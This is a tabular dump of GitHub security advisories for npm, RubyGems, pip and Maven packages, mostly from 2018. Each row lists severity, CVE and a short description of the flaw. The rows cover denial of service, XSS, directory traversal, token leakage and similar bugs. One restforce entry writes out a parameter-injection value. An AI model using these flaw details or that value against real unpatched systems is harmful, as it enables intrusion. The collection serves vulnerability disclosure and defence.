1403,16345,hapi,GHSA-cqjg-whmm-8gv6,CVE-2017-16013,https://github.com/advisories/GHSA-cqjg-whmm-8gv6,moderate,2018-10-09 00:57:28 UTC,Denial of Service via malformed accept-encoding header in hapi,"Affected versions of `hapi` will crash or lock the event loop when a malformed `accept-encoding` header is recieved.


## Recommendation

Update to version 16.1.1 or later.",npm
1404,16784,protobufjs,GHSA-762f-c2wg-m8c8,CVE-2018-3738,https://github.com/advisories/GHSA-762f-c2wg-m8c8,moderate,2018-10-09 00:27:15 UTC,Denial of Service in protobufjs,"Versions of `protobufjs` before 5.0.3 and 6.8.6 are vulnerable to denial of service when parsing crafted invalid *.proto files.


## Recommendation

Update to version 5.0.3, 6.8.6 or later.",npm
1405,17503,atob,GHSA-8w4h-3cm3-2pm2,CVE-2018-3745,https://github.com/advisories/GHSA-8w4h-3cm3-2pm2,moderate,2018-10-09 00:56:26 UTC,Out-of-bounds Read in atob,"Versions of `atob` before 2.1.0  uninitialized Buffers when number is passed in input on Node.js 4.x and below.


## Recommendation

Update to version 2.1.0 or later.",npm
1406,16840,deep-extend,GHSA-hr2v-3952-633q,CVE-2018-3750,https://github.com/advisories/GHSA-hr2v-3952-633q,critical,2018-10-09 00:44:59 UTC,Prototype Pollution in deep-extend,"Versions of `deep-extend` before 0.5.1 are vulnerable to prototype pollution.


## Recommendation

Update to version 0.5.1 or later.",npm
1407,33906,org.springframework:spring-core,GHSA-2m8h-fgr8-2q9w,CVE-2016-9878,https://github.com/advisories/GHSA-2m8h-fgr8-2q9w,high,2018-10-04 20:29:55 UTC,Pivotal Spring Framework Paths provided to the ResourceServlet were not properly sanitized,"An issue was discovered in Pivotal Spring Framework before 3.2.18, 4.2.x before 4.2.9, and 4.3.x before 4.3.5. Paths provided to the ResourceServlet were not properly sanitized and as a result exposed to directory traversal attacks.",maven
1408,34847,com.sparkjava:spark-core,GHSA-89gc-6cw6-4vch,CVE-2016-9177,https://github.com/advisories/GHSA-89gc-6cw6-4vch,high,2018-10-04 19:53:35 UTC,Spark allows remote attackers to read arbitrary files via a .. (dot dot) in the URI,Directory traversal vulnerability in Spark 2.5 allows remote attackers to read arbitrary files via a .. (dot dot) in the URI.,maven
1409,18863,jekyll,GHSA-4xjh-m3qx-49wc,CVE-2018-17567,https://github.com/advisories/GHSA-4xjh-m3qx-49wc,high,2018-09-28 19:29:07 UTC,"Jekyll allows attackers to access arbitrary files by specifying a symlink in the ""include"" key in the ""_config.yml"" file","Jekyll through 3.6.2, 3.7.x through 3.7.3, and 3.8.x through 3.8.3 allows attackers to access arbitrary files by specifying a symlink in the ""include"" key in the ""_config.yml"" file.",rubygems
1410,27604,rails-html-sanitizer,GHSA-77pc-q5q7-qg9h,,https://github.com/advisories/GHSA-77pc-q5q7-qg9h,moderate,2018-09-17 21:58:30 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,"Withdrawn, accidental duplicate publish.

Cross-site scripting (XSS) vulnerability in lib/rails/html/scrubbers.rb in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via a crafted CDATA node.",rubygems
1411,27604,rails-html-sanitizer,GHSA-mrhj-2g4v-39qx,,https://github.com/advisories/GHSA-mrhj-2g4v-39qx,moderate,2018-09-17 21:58:19 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,"Withdrawn, accidental duplicate publish.

Cross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem 1.0.2 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via an HTML entity that is mishandled by the Rails::Html::FullSanitizer class.",rubygems
1412,27604,rails-html-sanitizer,GHSA-qc8j-m8j3-rjq6,,https://github.com/advisories/GHSA-qc8j-m8j3-rjq6,moderate,2018-09-17 21:57:58 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,"Withdrawn, accidental duplicate publish.

Cross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via crafted tag attributes.",rubygems
1413,18817,activesupport,GHSA-35c4-f3rq-f9g3,,https://github.com/advisories/GHSA-35c4-f3rq-f9g3,moderate,2018-09-17 21:57:23 UTC,Moderate severity vulnerability that affects activesupport,"Withdrawn, accidental duplicate publish.

The (1) jdom.rb and (2) rexml.rb components in Active Support in Ruby on Rails before 4.1.11 and 4.2.x before 4.2.2, when JDOM or REXML is enabled, allow remote attackers to cause a denial of service (SystemStackError) via a large XML document depth.",rubygems
1414,18839,rack,GHSA-9vc2-p34x-jhxh,,https://github.com/advisories/GHSA-9vc2-p34x-jhxh,moderate,2018-09-17 21:56:30 UTC,Moderate severity vulnerability that affects rack,"Withdrawn, accidental duplicate publish.

lib/rack/utils.rb in Rack before 1.5.4 and 1.6.x before 1.6.2, as used with Ruby on Rails 3.x and 4.x and other products, allows remote attackers to cause a denial of service (SystemStackError) via a request with a large parameter depth.",rubygems
1415,19060,actionview,GHSA-6834-r92f-jj42,,https://github.com/advisories/GHSA-6834-r92f-jj42,moderate,2018-09-17 21:55:54 UTC,Moderate severity vulnerability that affects actionview,"Withdrawn, accidental duplicate publish.

Directory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.",rubygems
1416,18858,activemodel,GHSA-v543-gqhh-6gww,,https://github.com/advisories/GHSA-v543-gqhh-6gww,moderate,2018-09-17 21:55:43 UTC,Duplicate Advisory: Moderate severity vulnerability that affects activemodel,"## Duplicate advisory
This advisory has been withdrawn because it is a duplicate of [GHSA-543v-gj2c-r3ch](https://github.com/advisories/GHSA-543v-gj2c-r3ch). This link is maintained to preserve external references.

## Original Description
Active Model in Ruby on Rails 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 supports the use of instance-level writers for class accessors, which allows remote attackers to bypass intended validation steps via crafted parameters.",rubygems
1417,26832,doorkeeper,GHSA-685w-vc84-wxcx,CVE-2014-8144,https://github.com/advisories/GHSA-685w-vc84-wxcx,moderate,2018-09-17 21:55:22 UTC,Moderate severity vulnerability that affects doorkeeper,Cross-site request forgery (CSRF) vulnerability in doorkeeper before 1.4.1 allows remote attackers to hijack the authentication of unspecified victims for requests that read a user OAuth authorization code via unknown vectors.,rubygems
1418,18865,actionpack,GHSA-m53f-rhq8-q6hf,,https://github.com/advisories/GHSA-m53f-rhq8-q6hf,moderate,2018-09-17 21:55:03 UTC,Moderate severity vulnerability that affects actionpack,"Withdrawn, accidental duplicate publish.

actionpack/lib/action_dispatch/http/mime_type.rb in Action Pack in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not properly restrict use of the MIME type cache, which allows remote attackers to cause a denial of service (memory consumption) via a crafted HTTP Accept header.",rubygems
1419,18865,actionpack,GHSA-5xmj-wm96-fmw8,,https://github.com/advisories/GHSA-5xmj-wm96-fmw8,moderate,2018-09-17 21:54:37 UTC,Moderate severity vulnerability that affects actionpack,"Withdrawn, accidental duplicate publish.

Directory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.21, 4.0.x before 4.0.12, 4.1.x before 4.1.8, and 4.2.x before 4.2.0.beta4, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via vectors involving a \ (backslash) character, a similar issue to CVE-2014-7818.",rubygems
1420,18865,actionpack,GHSA-23v3-qfrj-wmgh,,https://github.com/advisories/GHSA-23v3-qfrj-wmgh,moderate,2018-09-17 21:54:22 UTC,Moderate severity vulnerability that affects actionpack,"Withdrawn, accidental duplicate publish.

Directory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.20, 4.0.x before 4.0.11, 4.1.x before 4.1.7, and 4.2.x before 4.2.0.beta3, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via a /..%2F sequence.",rubygems
1421,18865,actionpack,GHSA-qf5x-qgx7-437h,,https://github.com/advisories/GHSA-qf5x-qgx7-437h,moderate,2018-09-17 21:54:11 UTC,Moderate severity vulnerability that affects actionpack,"Withdrawn, accidental duplicate publish.

Directory traversal vulnerability in actionpack/lib/abstract_controller/base.rb in the implicit-render implementation in Ruby on Rails before 3.2.18, 4.0.x before 4.0.5, and 4.1.x before 4.1.1, when certain route globbing configurations are enabled, allows remote attackers to read arbitrary files via a crafted request.",rubygems
1422,18823,nokogiri,GHSA-7hp2-xwpj-95jq,CVE-2015-8806,https://github.com/advisories/GHSA-7hp2-xwpj-95jq,high,2018-09-17 21:53:42 UTC,"Nokogiri, dict.c in libxml2 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash)","dict.c in libxml2 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via an unexpected character immediately after the ""<!DOCTYPE html"" substring in a crafted HTML document.",rubygems
1423,18865,actionpack,GHSA-544j-77x9-h938,,https://github.com/advisories/GHSA-544j-77x9-h938,moderate,2018-09-17 21:53:30 UTC,Moderate severity vulnerability that affects actionpack,"Withdrawn, accidental duplicate publish.

actionpack/lib/action_dispatch/routing/route_set.rb in Action Pack in Ruby on Rails 4.x before 4.2.5.1 and 5.x before 5.0.0.beta1.1 allows remote attackers to cause a denial of service (superfluous caching and memory consumption) by leveraging an application's use of a wildcard controller route.",rubygems
1424,19951,websockets,GHSA-6g87-ff9q-v847,CVE-2018-1000518,https://github.com/advisories/GHSA-6g87-ff9q-v847,high,2018-09-17 20:46:52 UTC,High severity vulnerability that affects websockets,"The Python websockets library version 4 contains a CWE-409: Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in Servers and clients, unless configured with compression=None that can result in Denial of Service by memory exhaustion. This attack appears to be exploitable via sending a specially crafted frame on an established connection. This vulnerability appears to have been fixed in version 5.0",pip
1425,17380,bson,GHSA-8462-q7x7-g2x4,CVE-2018-13863,https://github.com/advisories/GHSA-8462-q7x7-g2x4,high,2018-09-17 20:44:58 UTC,High severity vulnerability that affects bson,The MongoDB bson JavaScript module (also known as js-bson) versions 0.5.0 to 1.0.x before 1.0.5 is vulnerable to a Regular Expression Denial of Service (ReDoS) in lib/bson/decimal128.js. The flaw is triggered when the Decimal128.fromString() function is called to parse a long untrusted string.,npm
1426,19367,bootstrap,GHSA-7mvr-5x2g-wfc8,CVE-2018-14042,https://github.com/advisories/GHSA-7mvr-5x2g-wfc8,moderate,2018-09-13 15:50:32 UTC,Moderate severity vulnerability that affects bootstrap,"In Bootstrap before 4.1.2, XSS is possible in the data-container property of tooltip.  This is similar to CVE-2018-14041.",rubygems
1427,18519,cryptiles,GHSA-rq8g-5pc5-wrhr,CVE-2018-1000620,https://github.com/advisories/GHSA-rq8g-5pc5-wrhr,critical,2018-09-11 18:22:50 UTC,Insufficient Entropy in cryptiles,"Versions of `cryptiles` prior to 4.1.2 are vulnerable to Insufficient Entropy. The `randomDigits()` method does not provide sufficient entropy and its generates digits that are not evenly distributed.


## Recommendation

Upgrade to version 4.1.2. The package is deprecated and has been moved to `@hapi/cryptiles` and it is strongly recommended to use the maintained package.",npm
1428,20092,ansible,GHSA-w578-j992-554x,CVE-2017-7481,https://github.com/advisories/GHSA-w578-j992-554x,critical,2018-09-06 03:28:50 UTC,Ansible fails to properly mark lookup-plugin results as unsafe,"Ansible before versions 2.3.1.0 and 2.4.0.0 fails to properly mark lookup-plugin results as unsafe. If an attacker could control the results of lookup() calls, they could inject Unicode strings to be parsed by the jinja2 templating system, resulting in code execution. By default, the jinja2 templating language is now marked as 'unsafe' and is not evaluated.",pip
1429,18887,rubyzip,GHSA-vqcq-mrmw-mcmg,CVE-2018-1000544,https://github.com/advisories/GHSA-vqcq-mrmw-mcmg,critical,2018-09-06 03:27:18 UTC,Rubyzip gem contains a Directory Traversal vulnerability in zip file component,"rubyzip gem rubyzip version 1.2.1 and earlier contains a Directory Traversal vulnerability in Zip::File component that can result in write arbitrary files to the filesystem. This attack appear to be exploitable via If a site allows uploading of .zip files , an attacker can upload a malicious file that contains symlinks or files with absolute pathnames ""../"" to write arbitrary files to the filesystem..

This is similar to CVE-2017-5946 which was patched in 1.2.1 but the fix in that case was incomplete.",rubygems
1430,18899,ffi,GHSA-2gw2-8q9w-cw8p,CVE-2018-1000201,https://github.com/advisories/GHSA-2gw2-8q9w-cw8p,high,2018-08-31 14:55:43 UTC,Ruby-ffi has a DLL loading issue,"ruby-ffi version 1.9.23 and earlier has a DLL loading issue which can be hijacked on Windows OS, when a Symbol is used as DLL name instead of a String This vulnerability appears to have been fixed in v1.9.24 and later.",rubygems
1431,26743,ember-source,GHSA-m3q7-rj8g-m457,CVE-2015-7565,https://github.com/advisories/GHSA-m3q7-rj8g-m457,moderate,2018-08-28 22:33:24 UTC,Moderate severity vulnerability that affects ember-source,"Cross-site scripting (XSS) vulnerability in Ember.js 1.8.x through 1.10.x, 1.11.x before 1.11.4, 1.12.x before 1.12.2, 1.13.x before 1.13.12, 2.0.x before 2.0.3, 2.1.x before 2.1.2, and 2.2.x before 2.2.1 allows remote attackers to inject arbitrary web script or HTML.",rubygems
1432,27168,passenger,GHSA-qw8w-2xcp-xg59,CVE-2014-1832,https://github.com/advisories/GHSA-qw8w-2xcp-xg59,low,2018-10-10 17:29:27 UTC,Low severity vulnerability that affects passenger,Phusion Passenger 4.0.37 allows local users to write to certain files and directories via a symlink attack on (1) control_process.pid or a (2) generation-* file.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-1831.,rubygems
1433,27168,passenger,GHSA-c7j7-p5jq-26ff,CVE-2014-1831,https://github.com/advisories/GHSA-c7j7-p5jq-26ff,low,2018-10-10 17:29:20 UTC,Low severity vulnerability that affects passenger,Phusion Passenger before 4.0.38 allows local users to write to certain files and directories via a symlink attack on (1) control_process.pid or a (2) generation-* file.,rubygems
1434,26743,ember-source,GHSA-4q53-fqhc-cr46,CVE-2014-0046,https://github.com/advisories/GHSA-4q53-fqhc-cr46,low,2018-08-28 22:33:42 UTC,Low severity vulnerability that affects ember-source,"Cross-site scripting (XSS) vulnerability in the link-to helper in Ember.js 1.2.x before 1.2.2, 1.3.x before 1.3.2, and 1.4.x before 1.4.0-beta.6, when used in non-block form, allows remote attackers to inject arbitrary web script or HTML via the title attribute.",rubygems
1435,27168,passenger,GHSA-fxwv-953p-7qpf,CVE-2015-7519,https://github.com/advisories/GHSA-fxwv-953p-7qpf,low,2018-10-10 17:29:13 UTC,Phusion Passenger allows remote attackers to spoof headers passed to applications by using an _ (underscore) character instead of a - (dash) character in an HTTP header,"agent/Core/Controller/SendRequest.cpp in Phusion Passenger before 4.0.60 and 5.0.x before 5.0.22, when used in Apache integration mode or in standalone mode without a filtering proxy, allows remote attackers to spoof headers passed to applications by using an _ (underscore) character instead of a - (dash) character in an HTTP header, as demonstrated by an X_User header.",rubygems
1436,27851,gollum,GHSA-m2q3-53fq-7h66,CVE-2015-7314,https://github.com/advisories/GHSA-m2q3-53fq-7h66,moderate,2018-08-28 22:33:51 UTC,Moderate severity vulnerability that affects gollum,The Precious module in gollum before 4.0.1 allows remote attackers to read arbitrary files by leveraging the lack of a certain temporary-file check.,rubygems
1437,26743,ember-source,GHSA-mp78-r56v-45qc,CVE-2015-1866,https://github.com/advisories/GHSA-mp78-r56v-45qc,moderate,2018-08-28 22:34:31 UTC,Moderate severity vulnerability that affects ember-source,Cross-site scripting (XSS) vulnerability in Ember.js 1.10.x before 1.10.1 and 1.11.x before 1.11.2.,rubygems
1438,19900,pycryptodome,GHSA-hgg3-g7gr-66r7,CVE-2018-15560,https://github.com/advisories/GHSA-hgg3-g7gr-66r7,high,2018-08-27 19:52:28 UTC,High severity vulnerability that affects pycryptodome,"PyCryptodome before 3.6.6 has an integer overflow in the data_len variable in AESNI.c, related to the AESNI_encrypt and AESNI_decrypt functions, leading to the mishandling of messages shorter than 16 bytes.",pip
1439,16343,electron,GHSA-hv9c-qwqg-qj3v,CVE-2018-15685,https://github.com/advisories/GHSA-hv9c-qwqg-qj3v,high,2018-08-23 19:12:08 UTC,Electron webPreferences vulnerability can be used to perform remote code execution,"GitHub Electron 1.7.15, 1.8.7, 2.0.7, and 3.0.0-beta.6, in certain scenarios involving IFRAME elements and ""nativeWindowOpen: true"" or ""sandbox: true"" options, is affected by a webPreferences vulnerability that can be leveraged to perform remote code execution.

More information to determine if you are impacted can be found on the [electron blog](https://electronjs.org/blog/web-preferences-fix).


## Recommendation

Upgrade Electron to >=3.0.0-beta.7, >=2.0.8, >=1.8.8, or >=1.7.16.",npm
1440,27901,ruby-saml,GHSA-36p7-xjw8-h6f2,CVE-2016-5697,https://github.com/advisories/GHSA-36p7-xjw8-h6f2,high,2018-08-21 17:08:30 UTC,Ruby-saml allows attackers to perform XML signature wrapping attacks via unspecified vectors,Ruby-saml before 1.3.0 allows attackers to perform XML signature wrapping attacks via unspecified vectors.,rubygems
1441,18823,nokogiri,GHSA-fr52-4hqw-p27f,CVE-2016-4658,https://github.com/advisories/GHSA-fr52-4hqw-p27f,critical,2018-08-21 19:03:26 UTC,Nokogiri does not forbid namespace nodes in XPointer ranges,"xpointer.c in libxml2 before 2.9.5 (as used in nokogiri before 1.7.1 amongst other products) does not forbid namespace nodes in XPointer ranges, which allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free and memory corruption) via a crafted XML document.",rubygems
1442,27168,passenger,GHSA-cqxw-3p7v-p9gr,CVE-2016-10345,https://github.com/advisories/GHSA-cqxw-3p7v-p9gr,high,2018-08-21 17:08:03 UTC,Phusion Passenger uses a known /tmp filename,"In Phusion Passenger before 5.1.0, a known /tmp filename was used during passenger-install-nginx-module execution, which could allow local attackers to gain the privileges of the passenger user",rubygems
1443,19293,minitar,GHSA-cwp3-834g-x79g,,https://github.com/advisories/GHSA-cwp3-834g-x79g,moderate,2018-08-21 17:07:36 UTC,Moderate severity vulnerability that affects archive-tar-minitar and minitar,"Withdrawn, accidental duplicate publish.

Directory traversal vulnerability in the minitar before 0.6 and archive-tar-minitar 0.5.2 gems for Ruby allows remote attackers to write to arbitrary files via a .. (dot dot) in a TAR archive entry.",rubygems
1444,18828,activerecord,GHSA-hm48-76wh-q86v,,https://github.com/advisories/GHSA-hm48-76wh-q86v,high,2018-08-21 19:03:17 UTC,High severity vulnerability that affects activerecord,"Withdrawn, accidental duplicate publish.

activerecord/lib/active_record/relation/query_methods.rb in Active Record in Ruby on Rails 4.0.x before 4.0.9 and 4.1.x before 4.1.5 allows remote attackers to bypass the strong parameters protection mechanism via crafted input to an application that makes create_with calls.",rubygems
1445,18853,redcarpet,GHSA-7322-9mx6-5j2m,CVE-2015-5147,https://github.com/advisories/GHSA-7322-9mx6-5j2m,high,2018-08-15 20:04:30 UTC,High severity vulnerability that affects redcarpet,Stack-based buffer overflow in the header_anchor function in the HTML renderer in Redcarpet before 3.3.2 allows attackers to cause a denial of service (crash) and possibly execute arbitrary code via unspecified vectors.,rubygems
1446,16942,url-parse,GHSA-pv4c-p2j5-38j4,CVE-2018-3774,https://github.com/advisories/GHSA-pv4c-p2j5-38j4,high,2018-08-13 15:02:15 UTC,Open Redirect in url-parse,"Versions of `url-parse` before 1.4.3 returns the wrong hostname which could lead to Open Redirect, Server Side Request Forgery (SSRF), or Bypass Authentication Protocol vulnerabilities.


## Recommendation

Update to version 1.4.3 or later.",npm
1447,26832,doorkeeper,GHSA-694m-jhr9-pf77,CVE-2018-1000211,https://github.com/advisories/GHSA-694m-jhr9-pf77,high,2018-08-13 20:46:41 UTC,High severity vulnerability that affects doorkeeper,"Doorkeeper version 4.2.0 and later contains a Incorrect Access Control vulnerability in Token revocation API's authorized method that can result in Access tokens are not revoked for public OAuth apps, leaking access until expiry.",rubygems
1448,18865,actionpack,GHSA-hx46-vwmx-wx95,,https://github.com/advisories/GHSA-hx46-vwmx-wx95,high,2018-08-13 20:48:25 UTC,High severity vulnerability that affects actionpack,"Withdrawn, accidental duplicate publish.

Action Pack in Ruby on Rails before 3.2.22.2, 4.x before 4.1.14.2, and 4.2.x before 4.2.5.2 allows remote attackers to execute arbitrary Ruby code by leveraging an application's unrestricted use of the render method.",rubygems
1449,19060,actionview,GHSA-2pwf-xwr3-hp55,,https://github.com/advisories/GHSA-2pwf-xwr3-hp55,moderate,2018-08-13 20:48:52 UTC,Moderate severity vulnerability that affects actionview,"Withdrawn, accidental duplicate publish.

Directory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.2 and 4.x before 4.1.14.2 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-0752.",rubygems
1450,15852,debug,GHSA-gxpj-cx7g-858c,CVE-2017-16137,https://github.com/advisories/GHSA-gxpj-cx7g-858c,low,2018-08-09 20:18:07 UTC,Regular Expression Denial of Service in debug,"Affected versions of `debug` are vulnerable to regular expression denial of service when untrusted user input is passed into the `o` formatter. 

As it takes 50,000 characters to block the event loop for 2 seconds, this issue is a low severity issue.


## Recommendation

Version 2.x.x: Update to version 2.6.9 or later.
Version 3.x.x: Update to version 3.1.0 or later.",npm
1451,29184,rope,GHSA-r38r-qp28-2m63,CVE-2014-3539,https://github.com/advisories/GHSA-r38r-qp28-2m63,critical,2018-07-26 16:08:49 UTC,Critical severity vulnerability that affects rope,base/oi/doa.py in the Rope library in CPython (aka Python) allows remote attackers to execute arbitrary code by leveraging an unsafe call to pickle.load.,pip
1452,26832,doorkeeper,GHSA-5p9f-55j8-922m,,https://github.com/advisories/GHSA-5p9f-55j8-922m,moderate,2018-08-13 20:49:10 UTC,Moderate severity vulnerability that affects doorkeeper,"Withdrawn, accidental duplicate publish.

The Doorkeeper gem before 4.2.0 for Ruby might allow remote attackers to conduct replay attacks or revoke arbitrary tokens by leveraging failure to implement the OAuth 2.0 Token Revocation specification.",rubygems
1453,18828,activerecord,GHSA-m8h6-m9p5-p2f8,,https://github.com/advisories/GHSA-m8h6-m9p5-p2f8,moderate,2018-08-13 20:49:01 UTC,Moderate severity vulnerability that affects activerecord,"Withdrawn, accidental duplicate publish.

Active Record in Ruby on Rails 4.2.x before 4.2.7.1 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request, as demonstrated by certain ""[nil]"" values, a related issue to CVE-2012-2660, CVE-2012-2694, and CVE-2013-0155.",rubygems
1454,19336,rails_admin,GHSA-pxqr-8v54-m2hj,CVE-2016-10522,https://github.com/advisories/GHSA-pxqr-8v54-m2hj,moderate,2018-08-08 22:30:35 UTC,Moderate severity vulnerability that affects rails_admin,"rails_admin ruby gem <v1.1.1 is vulnerable to cross-site request forgery (CSRF) attacks. Non-GET methods were not validating CSRF tokens and, as a result, an attacker could hypothetically gain access to the application administrative endpoints exposed by the gem.",rubygems
1455,27066,web-console,GHSA-82x2-g7vr-39wq,,https://github.com/advisories/GHSA-82x2-g7vr-39wq,moderate,2018-08-13 20:48:09 UTC,Moderate severity vulnerability that affects web-console,"Withdrawn, accidental duplicate publish.

request.rb in Web Console before 2.1.3, as used with Ruby on Rails 3.x and 4.x, does not properly restrict the use of X-Forwarded-For headers in determining a client's IP address, which allows remote attackers to bypass the whitelisted_ips protection mechanism via a crafted request.",rubygems
1456,18985,paperclip,GHSA-phmw-pv3f-vvx7,,https://github.com/advisories/GHSA-phmw-pv3f-vvx7,moderate,2018-08-13 20:47:44 UTC,Moderate severity vulnerability that affects paperclip,"Withdrawn, accidental duplicate publish.

The thoughtbot paperclip gem before 4.2.2 for Ruby does not consider the content-type value during media-type validation, which allows remote attackers to upload HTML documents and conduct cross-site scripting (XSS) attacks via a spoofed value, as demonstrated by image/jpeg.",rubygems
1457,18836,rest-client,GHSA-3fhf-6939-qg8p,CVE-2015-1820,https://github.com/advisories/GHSA-3fhf-6939-qg8p,critical,2018-08-13 20:47:22 UTC,rest-client vulnerable to Session Fixation,REST client for Ruby (aka rest-client) versions 1.6.1.a until 1.8.0 allow remote attackers to conduct session fixation attacks or obtain sensitive cookie information by leveraging passage of cookies set in a response to a redirect.,rubygems
1458,19108,grape,GHSA-f599-5m7p-hcpf,CVE-2018-3769,https://github.com/advisories/GHSA-f599-5m7p-hcpf,moderate,2018-08-13 20:45:32 UTC,Moderate severity vulnerability that affects grape,"The grape rubygem suffers from a cross-site scripting (XSS) vulnerability via ""format"" parameter.",rubygems
1459,27892,rack-mini-profiler,GHSA-995j-587r-259w,,https://github.com/advisories/GHSA-995j-587r-259w,moderate,2018-08-13 20:46:58 UTC,Moderate severity vulnerability that affects rack-mini-profiler,"Withdrawn, accidental duplicate publish.

The rack-mini-profiler gem before 0.10.1 for Ruby allows remote attackers to obtain sensitive information about allocated strings and objects by leveraging incorrect ordering of security checks.",rubygems
1460,19768,restforce,GHSA-534w-937m-v7x3,CVE-2018-3777,https://github.com/advisories/GHSA-534w-937m-v7x3,high,2018-08-03 21:04:02 UTC,High severity vulnerability that affects restforce,"A flaw in how restforce constructs URLs may allow an attacker to inject additional parameters into Salesforce API requests.   

Impact
------
This flaw is only exploitable in applications that pass user input directly to restforce's select, find, describe, update, upsert, and destroy methods.

Vulnerable code might look like:
```ruby
  client.select('SomeSalesForceObject', params[:some-id],
     ...)
```

In such an application, attackers could pass `0016000000MRatd/describe`  as a request parameter, causing the server to make a request to a different endpoint than the server is designed to handle. Since the Salesforce REST API supports overriding HTTP methods via a request parameter, an attacker could also cause the client's `select()` method to modify data, by passing `0016000000MRatd/?_HttpMethod=PATCH&other-query-params=...`.

Workarounds
------
If possible, applications should track salesforce IDs internally, rather than passing user-supplied IDs to salesforce. Such practice mitigates this vulnerability, and in general is desirable for ensuring strong access control.",rubygems
1461,16105,npm,GHSA-m5h6-hr3q-22h5,CVE-2016-3956,https://github.com/advisories/GHSA-m5h6-hr3q-22h5,high,2018-07-31 22:58:35 UTC,npm Token Leak in npm,"Affected versions of the `npm` package include the bearer token of the logged in user in every request made by the CLI, even if the request is not directed towards the user's active registry. 

An attacker could create an HTTP server to collect tokens, and by various means including but not limited to install scripts, cause the npm CLI to make a request to that server, which would compromise the user's token.

This compromised token could be used to do anything that the user could do, including publishing new packages.




## Recommendation

1. Update npm with `npm install npm@latest -g`
2. [Revoke your Tokens](https://www.npmjs.com/settings/tokens)
3. Enable [Two-Factor Authentication](https://docs.npmjs.com/getting-started/using-two-factor-authentication)",npm
1462,19850,cryptography,GHSA-fcf9-3qw3-gxmj,CVE-2018-10903,https://github.com/advisories/GHSA-fcf9-3qw3-gxmj,high,2018-07-31 18:28:09 UTC,High severity vulnerability that affects cryptography,A flaw was found in python-cryptography versions between >=1.9.0 and <2.3. The finalize_with_tag API did not enforce a minimum tag length. If a user did not validate the input length prior to passing it to finalize_with_tag an attacker could craft an invalid payload with a shortened tag (e.g. 1 byte) such that they would have a 1 in 256 chance of passing the MAC check. GCM tag forgeries can cause key leakage.,pip
1463,29639,mitmproxy,GHSA-6m53-c78q-7qmg,CVE-2018-14505,https://github.com/advisories/GHSA-6m53-c78q-7qmg,high,2018-07-31 18:18:19 UTC,Mitmweb in mitmproxy allows DNS Rebinding attacks,"mitmweb in mitmproxy before v4.0.4 allows DNS Rebinding attacks, related to tools/web/app.py.",pip
1464,19784,json-jwt,GHSA-mj4x-wcxf-hm8x,CVE-2018-1000539,https://github.com/advisories/GHSA-mj4x-wcxf-hm8x,moderate,2018-07-31 18:13:51 UTC,"Json-jwt (RubyGems) did not verify, or incorrectly verifies, the cryptographic signature for data",The json-jwt rubygem version >= 0.5.0 && < 1.9.4 contains a CWE-347: Improper Verification of Cryptographic Signature vulnerability in Decryption of AES-GCM encrypted JSON Web Tokens that can result in Attacker can forge a authentication tag. This attack appear to be exploitable via network connectivity. This vulnerability appears to have been fixed in 1.9.4 and later.,rubygems
1465,19489,rack-cors,GHSA-2j9c-9vmv-7m39,CVE-2017-11173,https://github.com/advisories/GHSA-2j9c-9vmv-7m39,high,2018-07-31 18:18:39 UTC,Missing anchor in Rack-Cors allows malicious third party site to perform CORS request,"Missing anchor in generated regex for rack-cors before 0.4.1 allows a malicious third-party site to perform CORS requests. If the configuration were intended to allow only the trusted example.com domain name and not the malicious example.net domain name, then example.com.example.net (as well as example.com-example.net) would be inadvertently allowed.",rubygems
1466,18823,nokogiri,GHSA-pf6m-fxpq-fg8v,CVE-2017-5029,https://github.com/advisories/GHSA-pf6m-fxpq-fg8v,high,2018-07-31 18:21:29 UTC,Nokogiri lacked integer overflow checks,"The xsltAddTextString function in transform.c in libxslt 1.1.29, as used in Nokogiri prior to 1.7.2, lacked a check for integer overflow during a size calculation, which allowed a remote attacker to perform an out of bounds memory write via a crafted HTML page.",rubygems
1467,18887,rubyzip,GHSA-3q5q-f79q-7hr2,,https://github.com/advisories/GHSA-3q5q-f79q-7hr2,high,2018-07-31 18:21:46 UTC,High severity vulnerability that affects rubyzip,"Withdrawn, accidental duplicate publish.

The Zip::File component in the rubyzip gem before 1.2.1 for Ruby has a directory traversal vulnerability. If a site allows uploading of .zip files, an attacker can upload a malicious file that uses ""../"" pathname substrings to write arbitrary files to the filesystem.",rubygems
